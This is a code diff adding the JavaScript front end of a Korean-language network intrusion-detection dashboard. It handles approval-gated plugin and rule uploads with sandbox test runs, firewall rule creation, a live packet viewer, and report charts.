+    det.addEventListener("toggle", () => { if (key) det.open ? guiRawOpen.add(key) : guiRawOpen.delete(key); });
+    box.append(det);
+  } else box.append(pre);
+  setTimeout(() => pre.scrollTop = pre.scrollHeight, 0);
+  return box;
+}
+$("#pdClose").addEventListener("click", () => $("#pluginDialog").close());
+$("#pluginDialog").addEventListener("close", () => { pdId = null; });
+
+function showErrors(box, errors, label) {
+  clear(box);
+  Object.entries(errors || {}).forEach(([n, why]) => box.append(el("div", {class: "perr"}, `${label} '${n}' 을(를) 불러오지 못했습니다: ${why}`)));
+}
+$("#pluginRescan").addEventListener("click", () => loadPlugins(true).catch((e) => alert(e.message)));
+async function loadPlugins(force) {
+  const d = await api("/api/plugins");
+  showErrors($("#pluginErrors"), d.errors, "플러그인");
+  pluginData = d.plugins;
+  const sig = JSON.stringify(d.plugins);
+  if (force || sig !== pluginSig) { pluginSig = sig; drawTools(); }
+  if (pdId) { const p = pluginData.find((x) => x.id === pdId); if (p) drawPluginDialog(p); }
+}
+
+// ── 플러그인 올리기 (승인 대기): 올리기·내용 보기·삭제만 가능. 승인은 서버 터미널의 approve_plugin.py 에서만 ──
+const openUploads = new Set();          // 펼쳐 둔 항목 (3초마다 다시 그려도 유지)
+const uploadText = {};                  // id + 해시 -> 파일 내용 (한 번만 불러옴)
+const sbState = {};                     // id -> 샌드박스 실행 상태·결과 (목록을 다시 그려도 사라지지 않게 카드 밖에 보관)
+let uploadSig = "";                     // 목록이 그대로면 다시 그리지 않음 (읽는 중에 스크롤이 튀지 않게)
+function uploadCard(u) {
+  if (u.error) return el("div", {class: "perr"}, `${u.id}: 읽을 수 없습니다 (${u.error})`);
+  const key = u.id + u.short;
+  const box = el("div", {});
+  if (u.findings.length) {
+    box.append(el("div", {class: "alert warning"}, el("b", {}, `검토가 필요한 패턴 ${u.findings.length}개`),
+      " (보안 장치가 아니라 표시일 뿐입니다. 코드를 직접 읽으세요)",
+      el("ul", {}, u.findings.map((f) => el("li", {}, `${f.file}:${f.line} ${f.what} — ${f.text}`)))));
+  }
+  const texts = uploadText[key];
+  if (texts) Object.entries(texts).forEach(([n, t]) => box.append(el("div", {}, el("div", {class: "caption"}, n), el("pre", {}, t))));
+  else box.append(el("div", {class: "caption"}, "내용을 불러오는 중…"));
+  const sb = sbState[u.id] || {};
+  const sbOut = el("div", {});
+  if (sb.busy) sbOut.append(el("div", {class: "caption"}, "격리 상태에서 실행 중…"));
+  else if (sb.error) sbOut.append(el("div", {class: "alert error"}, sb.error));
+  else if (sb.result) sbOut.append(el("div", {class: sb.result.timed_out ? "alert warning" : "alert info"},
+    `종료 코드: ${sb.result.rc === null ? "(시간 초과로 강제 종료)" : sb.result.rc}${sb.result.timed_out ? " · 시간 제한에 걸림" : ""}`),
+    guiOutput((sb.result.output || "").split("\n"), "sandbox:" + u.id));
+  const card = el("details", {class: "plugin"},
+    el("summary", {}, el("b", {}, u.name), el("span", {class: "tag"}, u.id), (u.tags || []).map((t) => el("span", {class: "tag"}, "#" + t)),
+      el("span", {class: "tag"}, "해시 " + u.short),
+      u.findings.length ? el("span", {class: "tag"}, `주의 ${u.findings.length}`) : null,
+      u.intact ? null : el("span", {class: "tag live"}, "변조됨")),
+    el("p", {class: "caption"}, `${u.description || "(설명 없음)"} · 파일 ${u.files.map((f) => f.name).join(", ")} · 올린 시각 ${fmtTime(u.uploaded_at)} · 올린 곳 ${u.uploader || "-"}`),
+    el("p", {class: "caption"}, "🧪 샌드박스로 실행해보기: 설치하지 않고 네트워크·파일시스템이 막힌 격리 상태에서 한 번만 돌려본다. 결과는 저장되지 않는다."),
+    el("p", {}, u.type === "rule" ? "승인(rules/ 에 '꺼진 상태'로 설치)은 보안 서버 터미널에서만 가능:" : "그래도 영구 설치(plugins/ 로 옮기기)는 보안 서버 터미널에서만 가능:"),
+    el("pre", {}, "approve"),
+    el("p", {class: "caption"}, `승인 화면 목록에서 '${u.id}' 를 골라 Enter → 끝까지 읽고 '승인' 선택 → yes 입력. ` +
+      `(approve 단축 명령이 없는 서버라면 python3 ~/guardian/dashboard/approve_plugin.py)`),
+    box,
+    el("div", {class: "row"},
+      el("button", {class: "btn sm", type: "button", ...(sb.busy ? {disabled: ""} : {}), onclick: async () => {
+        sbState[u.id] = {busy: true};
+        loadUploads(true).catch(() => {});
+        try {
+          sbState[u.id] = {result: await api(`/api/plugin_uploads/${u.id}/run_sandboxed`, "POST", {params: {}})};
+        } catch (e) { sbState[u.id] = {error: e.message}; }
+        loadUploads(true).catch(() => {});
+      }}, "🧪 샌드박스로 실행"),
+      el("button", {class: "btn sm", type: "button", onclick: async () => {
+        if (!confirm(`'${u.id}' 업로드를 삭제할까요?`)) return;
+        try { await api(`/api/plugin_uploads/${u.id}/delete`, "POST", {}); loadUploads(true); } catch (e) { alert(e.message); }
+      }}, "🗑️ 삭제")),
+    sbOut);
+  card.open = openUploads.has(u.id);
+  card.addEventListener("toggle", () => { if (card.open) openUploads.add(u.id); else openUploads.delete(u.id); });
+  if (!texts) api("/api/plugin_uploads/" + u.id).then((d) => { uploadText[key] = d.texts; loadUploads(true); }).catch(() => {});
+  return card;
+}
+// 올리기 칸은 두 곳: 도구(plugin.json → 승인하면 plugins/)와 플러그인 방식 탐지 규칙(rule.json → 승인하면 rules/ 에 꺼진 상태로)
+const UPLOAD_LISTS = [["tool", "#upList", "승인 대기 중인 도구가 없습니다."], ["rule", "#ruleUpList", "승인 대기 중인 규칙이 없습니다."]];
+async function loadUploads(force) {
+  if (!force && !(currentView === "tools" && $("#upBox").open) && !(currentView === "rules" && $("#ruleUpBox").open)) return;
+  const d = await api("/api/plugin_uploads");
+  const sig = JSON.stringify(d.uploads);
+  if (!force && sig === uploadSig) return;
+  uploadSig = sig;
+  UPLOAD_LISTS.forEach(([type, sel, none]) => {
+    const list = $(sel);
+    if (!force && typing(list)) return;
+    clear(list);
+    const items = d.uploads.filter((u) => (u.type || "tool") === type);   // 읽을 수 없는 항목(error)은 종류를 몰라 도구 칸에 표시
+    if (!items.length) list.append(el("div", {class: "caption"}, none));
+    items.forEach((u) => list.append(uploadCard(u)));
+  });
+}
+function bindUpload(boxSel, filesSel, sendSel, msgSel, expect) {
+  const need = expect === "rule" ? "rule.json 과 판정 스크립트" : "plugin.json 과 스크립트";
+  $(boxSel).addEventListener("toggle", () => { if ($(boxSel).open) loadUploads(true).catch(() => {}); });
+  $(sendSel).addEventListener("click", async () => {
+    const picked = [...$(filesSel).files];
+    if (!picked.length) return alertBox($(msgSel), "warning", `올릴 파일을 먼저 선택하세요 (${need}).`);
+    try {
+      const files = {};
+      for (const f of picked) files[f.name] = await f.text();
+      const r = await api("/api/plugin_uploads", "POST", {files, expect});
+      alertBox($(msgSel), "success", `'${r.upload.id}' 을(를) 올렸습니다. 아직 ${expect === "rule" ? "적용되지" : "실행되지"} 않습니다. 서버 터미널에서 내용을 확인하고 승인하세요 (해시 ${r.upload.short}).`
+        + (expect === "rule" ? " 승인하면 꺼진 상태로 설치되니, 위 카드에서 직접 켜세요." : ""));
+      $(filesSel).value = "";
+      loadUploads(true);
+    } catch (e) { alertBox($(msgSel), "error", e.message); }
+  });
+}
+bindUpload("#upBox", "#upFiles", "#upSend", "#upMsg", "tool");
+bindUpload("#ruleUpBox", "#ruleUpFiles", "#ruleUpSend", "#ruleUpMsg", "rule");
+
+const addBlock = blockControls({});
+$("#rBlockBox").append(addBlock.node);
+$("#ruleForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const ports = $("#rPorts").value.split(/[\s,]+/).filter(Boolean).map(Number);
+  const rule = {
+    id: $("#rId").value.trim(), name: $("#rName").value.trim() || $("#rId").value.trim(), description: $("#rDesc").value.replace(/\s*\n\s*/g, " ").trim(),
+    protocol: $("#rProto").value, dst_ports: ports, tcp_flags: $("#rFlags").value,
+    count: parseInt($("#rCount").value, 10), window_sec: parseInt($("#rWindow").value, 10),
+    distinct: $("#rDistinct").value, severity: $("#rSev").value, enabled: true, tags: splitTags($("#rTags").value),
+  };
+  try {
+    Object.assign(rule, addBlock.read());
+    await api("/api/rules", "POST", {rule});
+    alertBox($("#ruleMsg"), "success", `규칙 '${rule.id}' 이(가) 저장되었습니다. 5초 안에 적용됩니다.`);
+    loadRules();
+  } catch (err) { alertBox($("#ruleMsg"), "error", err.message); }
+});
+
+// ── 새 규칙 추가: 먼저 방식(방화벽/플러그인)을 묻는 창 ──
+$("#ruleAddBtn").addEventListener("click", () => $("#ruleTypeDialog").showModal());
+$("#chooseCancelBtn").addEventListener("click", () => $("#ruleTypeDialog").close());
+$("#chooseFwBtn").addEventListener("click", () => {
+  $("#ruleTypeDialog").close();
+  $("#ruleUpBox").open = false;
+  $("#fwRuleBox").open = true;
+  $("#fwRuleBox").scrollIntoView({behavior: "smooth", block: "center"});
+});
+$("#chooseScriptBtn").addEventListener("click", () => {     // 플러그인 방식 규칙은 올리기로만 추가 (양식 없음)
+  $("#ruleTypeDialog").close();
+  $("#fwRuleBox").open = false;
+  $("#ruleUpBox").open = true;
+  $("#ruleUpBox").scrollIntoView({behavior: "smooth", block: "center"});
+});
+
+// ── 패킷 보기 (와이어샤크처럼 지나가는 패킷 요약) ──
+// 1초마다 '마지막으로 받은 번호 이후' 패킷만 받아 표 맨 위에 쌓는다. 조건을 바꾸면 처음부터 다시 받는다.
+const PK_MAX = 500;
+const PK_DIR = {in: "⬇ 들어옴", out: "⬆ 나감", other: "·"};
+let pkLast = 0, pkPaused = false, pkBusy = false, pkRows = [];
+const pkTime = (t) => { const d = new Date(t * 1000); return d.toTimeString().slice(0, 8) + "." + String(d.getMilliseconds()).padStart(3, "0"); };
+
+function pkDraw() {
+  const tb = $("#pkRows");
+  const sel = window.getSelection();
+  if (sel && sel.toString() && tb.contains(sel.anchorNode)) return;   // 복사하려고 드래그 중이면 다시 그리지 않음
+  clear(tb);
+  if (!pkRows.length) tb.append(el("tr", {}, el("td", {colspan: 8}, pkPaused ? "일시정지 중입니다." : "조건에 맞는 패킷을 기다리는 중입니다…")));
+  const frag = document.createDocumentFragment();
+  pkRows.forEach((p) => frag.append(el("tr", {class: [p.proto === "ICMP" ? "icmp" : p.proto === "ARP" ? "arp" : "", p.dir === "out" ? "out" : ""].join(" ").trim()},
+    el("td", {}, p.seq), el("td", {}, pkTime(p.time)), el("td", {}, PK_DIR[p.dir] || ""),
+    el("td", {}, p.sport ? `${p.src}:${p.sport}` : p.src, noteTag(p.src)), el("td", {}, p.dport ? `${p.dst}:${p.dport}` : p.dst, noteTag(p.dst)),
+    el("td", {}, p.proto), el("td", {}, p.len), el("td", {}, p.info))));
+  tb.append(frag);
+  $("#pkCount").textContent = pkRows.length ? `${pkRows.length}개 표시 (최신 ${PK_MAX}개까지)` : "";
+}
+
+function pkReset() { pkLast = 0; pkRows = []; pkDraw(); loadPackets(); }
+
+async function loadPackets() {
+  if (pkPaused || pkBusy || document.hidden || currentView !== "packets" || $("#login").hidden === false) return;
+  pkBusy = true;
+  try {
+    const qs = new URLSearchParams({since: pkLast, limit: 200});
+    if ($("#pkProto").value) qs.set("proto", $("#pkProto").value);
+    if ($("#pkIp").value.trim()) qs.set("ip", $("#pkIp").value.trim());
+    if ($("#pkHide").checked) qs.set("hide_ports", ["22", "8000", location.port].filter(Boolean).join(","));
+    const d = await api("/api/packets?" + qs);
+    const box = $("#pkNotice"); clear(box);
+    if (!d.enabled) box.append(el("div", {class: "alert info"}, "패킷 기록이 꺼져 있습니다 (보안 서버 config.json 의 packet_view.enabled)."));
+    else if (d.unrecorded) box.append(el("div", {class: "caption"}, `초당 기록 한도를 넘어 ${d.unrecorded.toLocaleString()}개는 보관하지 않았습니다 (플러드 중이면 정상입니다).`));
+    if (d.last_seq < pkLast) { pkLast = 0; pkRows = []; pkDraw(); return; }   // Guardian 이 다시 시작됨
+    pkLast = d.last_seq;
+    if (d.packets.length) { pkRows = d.packets.reverse().concat(pkRows).slice(0, PK_MAX); pkDraw(); }
+  } catch (e) { /* 연결 상태는 3초 새로고침이 표시함 */ }
+  finally { pkBusy = false; }
+}
+["pkProto", "pkHide"].forEach((id) => $("#" + id).addEventListener("change", pkReset));
+$("#pkIp").addEventListener("input", pkReset);
+$("#pkPause").addEventListener("click", () => {
+  pkPaused = !pkPaused;
+  $("#pkPause").textContent = pkPaused ? "▶ 계속" : "⏸ 일시정지";
+  if (!pkPaused) loadPackets(); else pkDraw();
+});
+$("#pkClear").addEventListener("click", () => { pkRows = []; pkDraw(); });
+$("#pkPcap").addEventListener("click", () => {
+  const qs = new URLSearchParams();
+  if ($("#pkProto").value) qs.set("proto", $("#pkProto").value);
+  if ($("#pkIp").value.trim()) qs.set("ip", $("#pkIp").value.trim());
+  if ($("#pkHide").checked) qs.set("hide_ports", ["22", "8000", location.port].filter(Boolean).join(","));
+  downloadPcap(qs.toString(), $("#pkPcap"));
+});
+setInterval(loadPackets, 1000);
+pkDraw();
+
+// ── 점검·보고서 ──
+// rows: [이름, 값, (선택) 마우스를 올렸을 때 보일 글]
+function hbars(box, rows) {
+  clear(box);
+  if (!rows.length) return box.append(el("p", {class: "caption"}, "아직 기록이 없습니다."));
+  const max = Math.max(...rows.map((r) => r[1]));
+  rows.forEach(([name, n, tip]) => box.append(el("div", {class: "hbar", title: `${tip || name}: ${n}건`}, el("span", {class: "nm"}, name),
+    el("div", {class: "track"}, el("div", {class: "fill", style: `width:${Math.max(1, n / max * 100)}%`})), el("span", {class: "val"}, n))));
+}
+function timeChart(box, events) {
+  clear(box);
+  const hour = 3600000, end = Math.ceil(Date.now() / hour) * hour;
+  const bins = Array(24).fill(0);
+  events.forEach((e) => { const i = 23 - Math.floor((end - 1 - Date.parse(e.timestamp)) / hour); if (i >= 0 && i < 24) bins[i]++; });
+  const max = Math.max(1, ...bins), label = (i) => new Date(end - (24 - i) * hour).getHours() + "시";
+  box.append(el("div", {class: "tchart", role: "img", "aria-label": `최근 24시간 탐지 수, 최대 시간당 ${max}건`},
+    bins.map((n, i) => el("div", {class: "tcol", title: `${label(i)}: ${n}건`}, n ? el("div", {class: "tbar", style: `height:${n / max * 100}%`}) : null))));
+  box.append(el("div", {class: "taxis"}, el("span", {}, label(0)), el("span", {}, label(12)), el("span", {}, `지금 · 시간당 최대 ${max}건`)));
+}
+const browserOffset = () => { const m = -new Date().getTimezoneOffset(), p = (n) => String(Math.floor(n)).padStart(2, "0"); return `${m < 0 ? "-" : "+"}${p(Math.abs(m) / 60)}:${p(Math.abs(m) % 60)}`; };
+function drawPreflight(st, rules) {
+  const item = (ok, text) => el("li", {}, (ok === null ? "ℹ️ " : ok ? "✅ " : "⚠️ ") + text);
+  const box = $("#preflight"); clear(box);
+  const on = rules.filter((r) => r.enabled), off = rules.filter((r) => !r.enabled), never = on.filter((r) => !ruleHits[r.id]);
+  box.append(item(true, `Guardian 응답 정상 (감시 인터페이스 ${st.interface}, 켜진 지 ${fmtUp(st.uptime_sec)})`),
+    item(null, st.dry_run ? "지금 모드: 탐지만 (dry-run). 실제 차단 시연이면 개요에서 바꾸세요" : "지금 모드: 실제 차단"),
+    item(!myIp || st.whitelist.includes(myIp), myIp ? `이 PC(${myIp}) ${st.whitelist.includes(myIp) ? "는 화이트리스트에 있음" : "가 화이트리스트에 없음: 차단되면 대시보드에 못 들어옴"}` : "이 PC 주소를 확인하지 못함"),
+    item(st.utc_offset === browserOffset(), st.utc_offset === browserOffset() ? `서버와 이 PC 의 시간대가 같음 (${st.utc_offset})` : `서버 시간대(${st.utc_offset})가 이 PC(${browserOffset()})와 다름: 화면은 이 PC 기준이지만 서버 로그와 맞춰 보기 어려움`),
+    item(!off.length, off.length ? `꺼진 규칙 ${off.length}개: ${off.map((r) => r.name).join(", ")}` : "모든 규칙이 켜져 있음"),
+    item(!never.length, never.length ? `아직 한 번도 탐지 안 된 규칙 ${never.length}개 (시험해 보세요): ${never.map((r) => r.name).join(", ")}` : "켜진 규칙이 모두 한 번 이상 탐지됨"));
+}
+let reportEvents = [];
+async function loadReport() {
+  const [st, evs, rl, hist] = await Promise.all([api("/api/status"), api("/api/events?limit=1000"), api("/api/rules"), api("/api/history?limit=10")]);
+  ruleHits = rl.hits || {};
+  ipNotes = st.notes || {};
+  rl.rules.forEach((r) => { ruleNames[r.id] = r.name; ruleNotify[r.id] = r.notify || {}; });
+  reportEvents = evs.events;
+  const attacks = evs.events.filter((e) => !ADMIN_TYPES.has(e.type));
+  $("#repAt").textContent = "작성 시각 " + fmtTime(new Date().toISOString());
+  drawPreflight(st, rl.rules);
+  const s = st.stats || {}, sum = $("#repSummary"); clear(sum);
+  sum.append(metric("탐지된 위협", (s.events_total || 0) + " 건", `Critical ${attacks.filter((e) => e.severity === "critical").length} 건 (최근 기록 기준)`),
+    metric("자동 차단", (s.blocks_auto || 0) + " 건", `모의 ${s.blocks_auto_sim || 0} 건`),
+    metric("공격 출발지", hist.history.length + " 곳", "탐지 기록이 있는 IP·MAC (최대 10곳 표시)"),
+    metric("켜진 규칙", rl.rules.filter((r) => r.enabled).length + " 개", `전체 ${rl.rules.length} 개`));
+  timeChart($("#chartTime"), attacks);
+  // 메모가 있으면 메모를 이름으로 (주소는 길어서 메모가 잘림), 마우스를 올리면 주소와 메모
+  hbars($("#chartIps"), hist.history.map((h) => { const n = noteOf(h.source); return [n || h.source, h.total, n ? `${h.source} (메모: ${n})` : h.source]; }));
+  const byType = {};
+  attacks.forEach((e) => { byType[typeName(e.type)] = (byType[typeName(e.type)] || 0) + 1; });
+  hbars($("#chartTypes"), Object.entries(byType).sort((x, y) => y[1] - x[1]));
+  const rr = $("#repRules"); clear(rr);
+  rl.rules.forEach((r) => rr.append(el("tr", {}, el("td", {}, r.name), el("td", {}, r.enabled ? "켜짐" : "꺼짐"), el("td", {class: "sev-" + RISK[r.severity]}, RISK[r.severity]),
+    el("td", {}, blockText(r)), el("td", {}, (ruleHits[r.id] || {}).count || 0), el("td", {}, fmtTime((ruleHits[r.id] || {}).last)))));
+  const re = $("#repEvents"); clear(re);
+  if (!evs.events.length) re.append(el("tr", {}, el("td", {colspan: 6}, "아직 기록이 없습니다.")));
+  evs.events.forEach((e) => re.append(el("tr", {}, el("td", {}, fmtTime(e.timestamp)), el("td", {}, e.source, noteTag(e.source)), el("td", {}, typeName(e.type)),
+    el("td", {class: "sev-" + RISK[e.severity]}, RISK[e.severity] || e.severity), el("td", {}, ACTION[e.action] || e.action), el("td", {class: "wrap"}, e.detail))));
+}
+$("#repReload").addEventListener("click", () => loadReport().catch((e) => alert(e.message)));
+$("#repPrint").addEventListener("click", () => window.print());
+$("#repCsv").addEventListener("click", () => downloadCsv(reportEvents));
+
+// ── 주기적 새로고침: 상태·탐지 로그는 항상(알림용), 나머지는 보고 있는 메뉴 것만 받는다. 앞 요청이 안 끝났으면 건너뜀 (느린 VM 에서 쌓이지 않게) ──
+let refreshing = false, refreshTick = 0;
+async function refresh(force) {
+  if (refreshing && !force) return;
+  refreshing = true;
+  refreshTick++;
+  const jobs = [];
+  if (currentView === "policy") jobs.push(loadBlocked(), loadHistory(), loadAudit());
+  if (currentView === "tools") jobs.push(loadPlugins(force), loadUploads(force));
+  if (currentView === "rules") jobs.push(loadRules(), loadUploads(force));
+  else if (force || refreshTick % 10 === 1) jobs.push(loadRules());             // 이벤트에 규칙 이름을 쓰기 위해 가끔 받음
+  if (force && !myIp) jobs.push(api("/api/whoami").then((d) => { myIp = d.ip; }));
+  try {
+    await loadTop();
+    if (currentView === "policy") drawWhitelist();
+  } catch (e) {
+    if (e.message !== "로그인 필요") setGuardian(false, e.message.slice(0, 120));
+  }
+  await Promise.allSettled(jobs);
+  refreshing = false;
+}
+setInterval(() => { if ($("#login").hidden) refresh(false); }, 3000);
+
+// ── 왼쪽 메뉴: 한 번에 한 화면만 보여줌. 주소 뒤 #tools 처럼 기억해서 새로고침·뒤로가기도 그 화면으로 돌아옴 ──
+const VIEWS = ["overview", "packets", "policy", "tools", "rules", "report"];
+function showView(name, push) {
+  if (!VIEWS.includes(name)) name = "overview";
+  const prev = currentView;
+  currentView = name;
+  document.querySelectorAll(".view").forEach((v) => { v.hidden = v.dataset.view !== name; });
+  document.querySelectorAll(".navitem").forEach((n) => n.classList.toggle("active", n.dataset.view === name));
+  try {
+    if (location.hash !== "#" + name) history[push ? "pushState" : "replaceState"](null, "", "#" + name);
+  } catch (e) {}
+  if (name === "overview") { unread = 0; drawUnread(); }
+  if (name === prev) return;
+  window.scrollTo(0, 0);
+  if (name === "packets" && !pkPaused) pkReset();   // 안 보는 동안 쌓이지 않았으니 지금부터 새로 받음
+  if (token && $("#login").hidden) {
+    refresh(true);
+    if (name === "report") loadReport().catch(() => {});
+  }
+}
+// 클릭은 주소(#) 이동에 기대지 않고 직접 처리 (주소 이동이 막힌 곳에서 열어도 메뉴가 바뀜). 뒤로가기·직접 입력은 아래 두 이벤트로
+document.querySelectorAll(".navitem").forEach((n) => n.addEventListener("click", (e) => { e.preventDefault(); showView(n.dataset.view, true); }));
+window.addEventListener("popstate", () => showView(location.hash.slice(1)));
+window.addEventListener("hashchange", () => showView(location.hash.slice(1)));
+const startView = location.hash.slice(1);
+if (token) {
+  showView(startView);
+  refresh(true).then(() => { if (currentView === "report") loadReport().catch(() => {}); });
+} else {
+  $("#login").hidden = false;                         // 로그인 전에는 데이터를 받지 않음
+  showView(startView);
+}
+
+</script>
+</body>
+</html>
